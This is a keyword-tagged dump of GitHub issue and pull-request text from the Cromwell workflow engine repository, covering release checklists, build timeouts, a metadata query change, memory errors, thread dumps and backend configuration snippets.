time; ```. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [ ] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7457:605,detect,detecting,605,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7457,1,['detect'],['detecting']
Safety,"### Description. Fixes job recovery on restart for GCP Batch, addresses #7495. . ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7498:27,recover,recovery,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7498,1,['recover'],['recovery']
Safety,### Description. Part 2 of https://github.com/broadinstitute/cromwell/pull/7432. Detects and retries the new fatal quota errors we've been seeing. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [x] I added a suggested release notes entry in this Jira ticket; - [ ] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7439:81,Detect,Detects,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7439,1,['Detect'],['Detects']
Safety,"### Description. Resolves intermittent build breakage caused by 404s of `paleo-core` artifacts. `paleo-core` is deprecated, and so is the library that depends on it, `swagger2markup`. - Remove code and build components; - Clean up docs and provide reasonable replacements when necessary; - Removed the term ""REST"" as redundant because it has taken over as the dominant API type; - Reorganize current `CHANGELOG.md` into sections because we have a substantial number of release notes 🎉 ; - Unrelated one-line change to add timezone to debug image. ```; > docker run -it --entrypoint /bin/bash broadinstitute/cromwell:88-648e536-DEBUG; Version 88-648e536-DEBUG built at 2024-08-08 15:04:21 EDT; root@4ec372b744a8:/# ; ```. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7488:317,redund,redundant,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7488,1,['redund'],['redundant']
Safety,"### Description. We make this query constantly, looks like the single most frequent one against metadata. All it does is check whether the workflow ID is valid by checking whether >1 metadatum exists for it. We already started down the path of checking summary instead of metadata, see https://github.com/broadinstitute/cromwell/pull/4617. It just makes way more sense to me to check a table with 77M rows than 36B. ```; select ; exists(; select ; `CALL_FQN`, ; `METADATA_KEY`, ; `WORKFLOW_EXECUTION_UUID`, ; `METADATA_TIMESTAMP`, ; `JOB_SCATTER_INDEX`, ; `METADATA_JOURNAL_ID`, ; `JOB_RETRY_ATTEMPT`, ; `METADATA_VALUE_TYPE`, ; `METADATA_VALUE` ; from ; `METADATA_ENTRY` ; where ; `WORKFLOW_EXECUTION_UUID` = '602a4913-d666-4182-b2f1-242fbda817d2'; );; ```. It is potentially implicated in the 2021 database migration that failed at the very end, you can see a bunch of them in this screenshot (2021-11-09):. <img width=""1792"" alt=""Screen Shot 2021-11-09 at 1 14 03 AM"" src=""https://github.com/user-attachments/assets/d3eee3da-9636-4406-a6f9-9862d33cd650"">. ```; Lock wait timeout exceeded; try restarting transaction; [for Statement ""RENAME TABLE `cromwell`.`METADATA_ENTRY` TO `cromwell`.`_METADATA_ENTRY_old`,; `cromwell`.`_METADATA_ENTRY_new` TO `cromwell`.`METADATA_ENTRY`""]; at /usr/bin/pt-online-schema-change line 10922.; ```; [Slack link to contemporary discussion.](https://broadinstitute.slack.com/archives/C02LCC8968N/p1636439602084200); [Contemporary analysis in JIRA.](https://broadworkbench.atlassian.net/browse/WM-906?focusedCommentId=53394). ### Release Notes Confirmation. #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [x] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7575:1074,timeout,timeout,1074,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575,1,['timeout'],['timeout']
Safety,"### EDIT: See https://www.traviscistatus.com/incidents/kyf149kl6bvp. Multiple builds are displaying timeouts trying to run the dockerScripts tests. These builds have a heartbeat that give more information as to the timeout:; - https://travis-ci.com/broadinstitute/cromwell/jobs/197403844; - https://travis-ci.com/broadinstitute/cromwell/jobs/197407990; - https://travis-ci.com/broadinstitute/cromwell/jobs/197412193; - https://travis-ci.com/broadinstitute/cromwell/jobs/197420904. May be something that broke in our repo, or an upstream transient error?. Edit:. Just commenting out the `sbt assembly` is not enough. Commenting out just the assembly leads to downstream build errors such as:; - https://travis-ci.com/broadinstitute/cromwell/jobs/197523977",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4933:100,timeout,timeouts,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4933,2,['timeout'],"['timeout', 'timeouts']"
Safety,"### What happened. On 10/10/2018, around 11:15 AM, there was a spike in backpressure and 403 copy failures. It was discovered that a user had submitted workflows attempting to access buckets it did not have access to. . ![image](https://user-images.githubusercontent.com/16748522/46764755-59087300-ccab-11e8-9163-afd953710adf.png); Purple line- backpressure; Light green line- 403 copy failures. ### What was done to fix it. The situation was discussed with the user, and once he aborted all his workflows, Cromwell slowly returned to its normal state. The issue was resolved around 1:50 PM. ### Potential causes. The user had reused a WDL from another user, but he didn't have access to their Google Cloud buckets. This workflow contained job that ran 5000 split intervals against dataset of approx 1300 samples. Each of the 5000 outputs would be copied, per workflow, per sample. Depending on the number of samples the other user had previously run, each interval-output-for-each-sample tried call caching to other user's workspace. This resulted in a lot of attempts to copy files and then failures.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4229:480,abort,aborted,480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4229,1,['abort'],['aborted']
Safety,"### Wordy Description. * We will no longer update the womtool libraries in Agora and Rawls. We will accept the minor drift which may occur between ""what Rawls thinks Cromwell could run"" and ""what Cromwell can actually run"" until womtool as a service is adopted.; * We will no longer run smoke tests before and after each update. We will rely on swatomation and daily runs to detect problems. ### Current Process:; ![Current Process](https://github.com/broadinstitute/cromwell/blob/develop/scripts/release_processes/firecloud-develop.dot.png?raw=true). ### Proposed New Process:; ![Proposed New Process](https://github.com/broadinstitute/cromwell/blob/cjl_simplify_releases/scripts/release_processes/firecloud-develop.dot.png?raw=true). ### Proposed Hotfix Process:; ![Proposed Hotfix Process](https://github.com/broadinstitute/cromwell/blob/cjl_simplify_releases/scripts/release_processes/firecloud-develop-hotfix.dot.png?raw=true)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941:375,detect,detect,375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941,1,['detect'],['detect']
Safety,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. Hi there,. My workflow runs out of memory. I'm not sure where exactly though. I'm trying to run Mutect2 on a large cohort of samples, but it keeps crashing with an out of memory error. Any help would be extremely helpful as to how I can avoid this issue. I'm using `-Xmx32g` when I call cromwell, and am using GCS as the backend. Here the error:; ```; ### GetPileupSummaries; # These must be created, even if they remain empty, as cromwell doesn't support optional output; touch tumor-pileups.table; touch normal-pileups.table. if [[ ! -z """" ]]; then; gatk --java-options ""-Xmx3000m"" GetPileupSummaries -R gs://nicholas-b-test/references/genome.fa -I gs://nicholas-b-test/Mutect2_multisample/4f039d1f-f981-4a6d-98b3-be9cd92d3e62/call-Mutect2/shard-439/Mutect2/d19d9b83-bda0-40b6-89e6-7f74d3f76988/call-TumorCramToBam/1046545_23163_0_0.bam --interval-set-rule INTERSECTION -L gs://nicholas-b-test/Mutect2_multisample/4f039d1f-f981-4a6d-98b3-be9cd92d3e62/call-Mutect2/shard-439/Mutect2/d19d9b83-bda0-40b6-89e6-7f74d3f76988/call-SplitIntervals/glob-0fc990c5ca95eebc97c4c204e3e303e1/0013-scattered.interval_list \; -V -L -O tumor-pileups.table. if [[ ! -z """" ]]; then; gatk --java-options ""-Xmx3000m"" GetPileupSummaries -R gs://nicholas-b-test/references/genome.fa -I --interval-set-rule INTERSECTION -L gs://nicholas-b-test/Mutect2_multisample/4f039d1f-f981-4a6d-98b3-be9cd92d3e62/call-Mutect2/shard-439/Mutect2/d19d9b83-bda0-40b6-89e6-7f74d3f76988/call-SplitIntervals/glob-0fc990c5ca95eebc97c4c204e3e303e1/0013-scattered.interval_list \; -V -L -O normal-pileups.table; fi; fi; OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00007fbe6d000000, 4345298944, 0) failed; error='Not enough space' (errno=12); #; # There is insufficient memory for the Java Runtime Environ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347:463,avoid,avoid,463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347,1,['avoid'],['avoid']
Safety,"$common$api$PipelinesApiRequestWorker$$handleBatch(PipelinesApiRequestWorker.scala:53); at cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker$$anonfun$receive$1.applyOrElse(PipelinesApiRequestWorker.scala:36); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker.aroundReceive(PipelinesApiRequestWorker.scala:19); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-139 WARN - PAPI request worker PAPIQueryWorker-aaa95e49-59b4-4de6-864d-22920eac6164 terminated. 99 run creation requests, 1 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; ```. Of note, I am running Cromwell 40 with the following `java -Xmx100g -Dconfig.file=google.conf -jar cromwell-40.jar server` on a 16-core highmem system that has 102g of RAM. Of those 102G, only 30G are in use per `htop` (including both active and cache). Cromwell does continue, but the concern, as noted in the error, is that 99 jobs might now be duplicated. If I run with just 1 or 2 jobs, I don't get this message.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:4588,abort,abort,4588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['abort'],['abort']
Safety,(We don't actually have a pluggable SGE backend ATM but just entering this for completeness since the other backends had the same issue). Actual code:. ``` scala; override def abortInitialization(): Unit = ???; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1112:176,abort,abortInitialization,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1112,1,['abort'],['abortInitialization']
Safety,"); at akka.util.SerializedSuspendableExecutionContext.run(SerializedSuspendableExecutionContext.scala); at akka.dispatch.TaskInvocation.run(Redefined); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Abandoned connection cleanup thread"" #22 daemon prio=5 os_prio=31 tid=0x00007fb76a4f5800 nid=0x7103 in Object.wait() [0x000000012ccb5000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c0624180> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""ForkJoinPool-3-worker-15"" #19 daemon prio=5 os_prio=31 tid=0x00007fb76abaa800 nid=0x6b03 waiting on condition [0x000000012a1e3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:44465,Unsafe,Unsafe,44465,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"* JES; * cromwell-30.jar. I have two `write_tsv()` calls in the command block. This code works fine locally. ```; task trim_adapter { # trim adapters and merge trimmed fastqs; 	# parameters from workflow; 	Array[Array[File]] fastqs 		# [merge_id][end_id]; 	Array[Array[String]] adapters 	# [merge_id][end_id]; 	Boolean paired_end; 	# mandatory; 	Boolean auto_detect_adapter		# automatically detect/trim adapters; 	# optional; 	Int? min_trim_len 		# minimum trim length for cutadapt -m; 	Float? err_rate			# Maximum allowed adapter error rate ; 							# for cutadapt -e	; 	# resource; 	Int? cpu; 	Int? mem_mb; 	Int? time_hr; 	String? disks. 	command {; 		python $(which encode_trim_adapter.py) \; 			${write_tsv(fastqs)} \; 			${""--adapters "" + write_tsv(adapters)} \; 			${if paired_end then ""--paired-end"" else """"} \; 			${if auto_detect_adapter then ""--auto-detect-adapter"" else """"} \; 			${""--min-trim-len "" + min_trim_len} \; 			${""--err-rate "" + err_rate} \; 			${""--nth "" + select_first([cpu,4])}; 	}; 	output {; 		# WDL glob() globs in an alphabetical order; 		# so R1 and R2 can be switched, which results in an; 		# unexpected behavior of a workflow; 		# so we prepend merge_fastqs_'end'_ (R1 or R2); 		# to the basename of original filename; 		# this prefix will be later stripped in bowtie2 task; 		Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); 	}; 	runtime {; 		cpu : select_first([cpu,2]); 		memory : ""${select_first([mem_mb,'10000'])} MB""; 		time : select_first([time_hr,24]); 		disks : select_first([disks,""local-disk 100 HDD""]); 	}; }; ```; with Google JES backend, second call of write_tsv() doesn't seem to correctly pass temporary tsv file into a docker container. `${write_tsv()}` works fine.; `${""some string "" + write_tsv()}` does not work. It still has URI prefix `gs://`. ```; [2017-12-07 13:37:45,35] [info] JesAsyncBackendJobExecutionActor [17f0658fatac.trim_adapter:1:1]: python $(which encode_trim_adapter.py) \; /cromwell_root/atac-seq-pipeline-w",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3032:391,detect,detect,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3032,1,['detect'],['detect']
Safety,"* This actually has been officially removed from the draft-3 spec on account of it never being implemented by any engine.; * The read_json and write_json (and structs in draft-3) will hopefully ease a lot of the annoyances you're finding here (it's been known to be annoying, we're just finally able to put resources towards easing it now); * All WDL values are immutable as an early design choice for the language. Think of them less as variables in an imperative language and more as write-once declarations in a DAG (ie an execution graph). Say some subsequent task uses (edit: ~~len~~) `i` in your example above. If values are mutable then how can Cromwell know when it's safe to use the value? If you force all tasks to complete before anything after them starts then one slow task cannot run in parallel with several fast tasks.; * I think what you really want is some kind of list comprehension (eg equivalent to python's `[x + 1 for x in x_list]`). You can get something similar by using the implicit gather on a scatter. eg I could map over an array to calculate the ""values plus one"" array like this:; ```wdl; workflow foo {; Array[Int] input_array; scatter(i in input_array) {; plus_ones = i + 1; }; Array[Int] input_array_plus_ones = plus_ones # gathers the results from the plus-one'ing; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161:676,safe,safe,676,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161,1,['safe'],['safe']
Safety,"** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.instant_abort (5 seconds, 52 milliseconds); - should abort a workflow mid run abort.scheduled_abort (2 minutes, 20 seconds); - should abort a workflow mid run abort.sub_workflow_abort (3 minutes, 2 seconds); - should call cache the second run of cacheBetweenWF (2 minutes, 55 seconds); - should call cache the second run of call_cache_hit_prefixes_no_hint (1 minute, 40 seconds); - should call cache the second run of floating_tags (3 minutes, 25 seconds); - should fail during execution bad_docker_name (35 seconds, 238 milliseconds); - should fail during execution bad_workflow_failure_mode (5 seconds, 920 milliseconds); - should fail during execution chainfail (42 seconds, 454 milliseconds); - should fail during execution cont_while_possible (3 minutes, 57 seconds); - should fail during execution cont_while_possible_scatter (2 minutes, 27 seconds); - should fail during execution draft3_read_file_limits (3 minutes, 26 seconds); - should fail during execution empty_filename (16 seconds, 333 milliseconds); - should fail during execut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2630,abort,abort,2630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1572,timeout,timeout,1572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['timeout'],['timeout']
Safety,"**Commit 1**; Stop invoking scalacheck during the sbt build by replacing a) specs2 with specs2-mock plus pegdown, and b) excluding cats dependencies (also in wdl4s).; Removed cromwell dependency duplications (see the verboseness in excising cats' duplicated dependencies).; Just in case, pass scalatest arguments only to scalatest. **Commit 2**; 3 seconds timeout (instead of the 1 second default) for each of the slick and liquibase databases being compared.; Removed dead docker case class.; Formatting updates for sbt-docker.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1589:356,timeout,timeout,356,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1589,1,['timeout'],['timeout']
Safety,"**What Happened**; On 9/12/18 5:40 pm, after a Firecloud release, Cromwell 402 stopped responding to status checks. It only recovered after being restarted at 10pm.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4094:124,recover,recovered,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4094,1,['recover'],['recovered']
Safety,"**What happened:**; On 9/12/18 at 3:41 pm, the Cromwell servers' (801 and 802) CPU were pegged. 801 was restarted (4:11 pm) and immediately got pegged again but recovered 35 min later without further intervention. As for 802, the CPU remained pegged so, at 5:21 pm, 802 was restarted and recovered right away.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4093:161,recover,recovered,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4093,2,['recover'],['recovered']
Safety,"+1 to this feature. Is there a feature request submitted to the Cloud Health team to have the Pipelines API v2 distinguish regular preemption vs. preemption at 24 hours?. We needed to workaround this recently for an RNA alignment workflow (using STAR). What we did was to use the [timeout](https://linux.die.net/man/1/timeout) command:. ```; timeout 23.5h STAR <args>; ```. - We made it 23.5 hours to account for localization and delocalization time.; - By using the timeout, we got a hard-failure and avoided the ""run 24 hours and get preempted and retried"" cycle.; - We then manually re-ran these failures, setting the preemptible retries to 0 (and removing the timeout). . Managing the workflows in Terra made this all relatively painless.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499563563:281,timeout,timeout,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499563563,6,"['avoid', 'timeout']","['avoided', 'timeout']"
Safety,", each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any akka settings; http {; server {; # Increasing these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default value of 200 should be fine but for larger/production environments we recommend a; # # value of at least 500. There'll be no one size fits all number here so we recommend benchmarking performance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; method = ""remote""; }; }. engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }. call-caching {; enabled = true; }. backend {; default = GCPBATCH; providers {; GCPBATCH {; // life sciences; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {; ## Google project; project = ""$PROJECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:9038,safe,safety-threshold,9038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['safe'],['safety-threshold']
Safety,",; ""doc"": ""Minimum spread within candidate purities before somatics can be used. Default 0.15\n"",; ""id"": ""#somatic_min_purity_spread_purple""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Minimum number of somatic variants required to assist highly diploid fits. Default 300.\n"",; ""id"": ""#somatic_min_total_purple""; },; {; ""type"": [; ""null"",; ""float""; ],; ""doc"": ""Proportion of somatic deviation to include in fitted purity score. Default 1.\n"",; ""id"": ""#somatic_penalty_weight_purple""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Optional location of somatic variant vcf to assist fitting in highly-diploid samples.\nSample name must match tumor parameter. GZ files supported.\n"",; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#somatic_vcf_purple""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Optional location of structural variant vcf for more accurate segmentation.\nGZ files supported.\n"",; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#structural_vcf_purple""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Optional location of failing structural variants that may be recovered.\nGZ files supported.\n"",; ""secondaryFiles"": [; "".tbi""; ],; ""id"": ""#sv_recovery_vcf_purple""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads used for amber step\n"",; ""id"": ""#threads_amber""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads to run cobalt command\n"",; ""id"": ""#threads_cobalt""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads to use - set to 8 by default"",; ""id"": ""#threads_gridss""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads\n"",; ""id"": ""#threads_purple""; },; {; ""type"": ""File"",; ""doc"": ""tumour BAM file\n"",; ""secondaryFiles"": [; "".bai""; ],; ""id"": ""#tumor_bam""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""sample name of tumor. Must match the somatic snvvcf sample name. (Default: \\${sample}_T)\n"",; ""id"": ""#tumor_sample""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""htsjdk SAM/BAM validation level (STRICT (default), LENIENT, o",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:46840,recover,recovered,46840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['recover'],['recovered']
Safety,",; I am trying to run a workflow written in WDL using Cromwell v.65. The workflow reports the following error in the stdout:; ```[2023-08-11 14:21:11,58] [error] SingleWorkflowRunnerActor received Failure message: Metadata for workflow <UUID> exists in database but cannot be served because row count of 3138431 exceeds configured limit of 1000000.; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow <UUID> exists in database but cannot be served because row count of 3138431 exceeds configured limit of 1000000.```; This is after having edited the `cromwell.conf` as suggested in [this thread](https://github.com/broadinstitute/cromwell/issues/2519). The configuration file used is as follows (edited to remove the main script):; ```; include required(classpath(""application"")); backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 300; runtime-attributes = """"""; Int cpu; Int memory_mb; String? lsf_queue; String? lsf_project; String? docker; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpu} \; 